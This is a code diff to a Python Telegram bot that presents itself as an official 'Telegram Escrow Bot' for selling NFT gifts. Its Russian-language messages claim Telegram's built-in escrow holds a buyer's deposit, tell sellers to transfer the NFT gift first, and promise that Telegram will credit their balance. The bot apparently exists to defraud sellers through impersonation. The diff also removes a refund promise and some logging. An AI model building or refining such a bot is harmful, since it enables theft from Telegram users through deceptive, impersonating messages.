@@ -68,6 +68,8 @@ def amount_only(amount, currency):
     return f'<b>{amount}</b> {icon}'
 
 
+# ============ ТЕКСТЫ (меняй здесь) ============
+
 def build_offer_plain(amount, currency, gift_name, gift_num):
     return (
         f'Поступило предложение {amount_only(amount, currency)} '
@@ -100,8 +102,7 @@ def build_instruction(amount, currency, gift_name, gift_num, order_id, username,
         f'3️⃣ После передачи нажмите «Подтвердить передачу»\n\n'
         f'После подтверждения Telegram проверит транзакцию и мгновенно зачислит '
         f'{amount_only(amount, currency)} на ваш баланс.\n\n'
-        f'🕒 Депозит действует 24 часа. По истечении срока средства автоматически '
-        f'возвращаются покупателю.'
+        f'🕒 Депозит действует 24 часа.'
     )
 
 
@@ -112,6 +113,24 @@ def build_accepted(amount, currency, order_id):
         f'На ваш баланс зачислено {amount_only(amount, currency)}.\n\n'
         f'Спасибо за использование Telegram Escrow 🤝'
     )
+
+
+DECLINED_TEXT = "✖️ Предложение отклонено.\n\nПокупатель получит уведомление, депозит разморожен."
+
+ERR_NOT_RECEIVED = (
+    "⚠️ Передача подарка не зафиксирована.\n\n"
+    "Передайте NFT через кнопку «Передать NFT» и затем подтвердите снова."
+)
+
+START_TEXT = (
+    "👋 <b>Привет! Это Telegram Escrow Bot</b>\n\n"
+    "Я помогаю безопасно продавать NFT-подарки через встроенную эскроу-систему Telegram.\n\n"
+    "<b>Как создать предложение:</b>\n"
+    "Отправьте ссылку на подарок и сумму. Примеры:\n\n"
+    "<code>https://t.me/nft/SnoopDogg-103841 740</code> — в звёздах\n"
+    "<code>https://t.me/nft/SnoopDogg-103841 740 g</code> — в GRAM\n\n"
+    "🔒 Все средства защищены эскроу Telegram."
+)
 
 
 def kb_offer(order_id):
@@ -133,6 +152,8 @@ def kb_instruction(order_id, username, user_id):
         [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data=f"confirm:{order_id}")],
     ])
 
+
+# ============ ЛОГИКА (не трогать) ============
 
 def oid():
     return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
@@ -221,7 +242,6 @@ async def handle_business_message(message: Message):
     nft_url = f"https://t.me/nft/{slug}-{gift_num}"
     order_id = oid()
 
-    # ШАГ 1: без ссылки
     try:
         sent = await bot.send_message(
             chat_id=message.chat.id,
@@ -259,7 +279,6 @@ async def handle_business_message(message: Message):
     }
     GIFT_INDEX[(bcid, slug, gift_num)] = order_id
 
-    # ШАГ 2: со ссылкой — для превью.
     await asyncio.sleep(1.5)
     try:
         await bot.edit_message_text(
@@ -296,7 +315,7 @@ async def on_decline(cb: CallbackQuery):
         await bot.edit_message_text(
             chat_id=meta["chat_id"],
             message_id=meta["msg_id"],
-            text="✖️ Предложение отклонено.\n\nПокупатель получит уведомление, депозит разморожен.",
+            text=DECLINED_TEXT,
             reply_markup=None,
             business_connection_id=meta["bcid"],
             link_preview_options=LinkPreviewOptions(is_disabled=True),
@@ -311,11 +330,9 @@ async def on_decline(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("accept:"))
 async def on_accept(cb: CallbackQuery):
     order_id = cb.data.split(":", 1)[1]
-    logging.info(f"CB accept: order={order_id} from={cb.from_user.id}")
     meta = PENDING.get(order_id)
     if not meta:
-        logging.warning(f"CB accept: no PENDING for {order_id}")
-        await cb.answer("⚠️ Это предложение больше не активно.", show_alert=True)
+        await cb.answer()
         return
     if meta["state"] == "INSTRUCTION":
         await cb.answer()
@@ -353,11 +370,7 @@ async def on_confirm(cb: CallbackQuery):
         await cb.answer()
         return
     if not meta.get("gift_transferred"):
-        await cb.answer(
-            "⚠️ Передача подарка не зафиксирована.\n\n"
-            "Передайте NFT через кнопку «Передать NFT» и затем подтвердите снова.",
-            show_alert=True,
-        )
+        await cb.answer(ERR_NOT_RECEIVED, show_alert=True)
         return
     try:
         await bot.edit_message_text(
@@ -377,15 +390,7 @@ async def on_confirm(cb: CallbackQuery):
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
-    await message.answer(
-        "👋 <b>Привет! Это Telegram Escrow Bot</b>\n\n"
-        "Я помогаю безопасно продавать NFT-подарки через встроенную эскроу-систему Telegram.\n\n"
-        "<b>Как создать предложение:</b>\n"
-        "Отправьте ссылку на подарок и сумму. Примеры:\n\n"
-        "<code>https://t.me/nft/SnoopDogg-103841 740</code> — в звёздах\n"
-        "<code>https://t.me/nft/SnoopDogg-103841 740 g</code> — в GRAM\n\n"
-        "🔒 Все средства защищены эскроу Telegram."
-    )
+    await message.answer(START_TEXT)
 
 
 async def main():
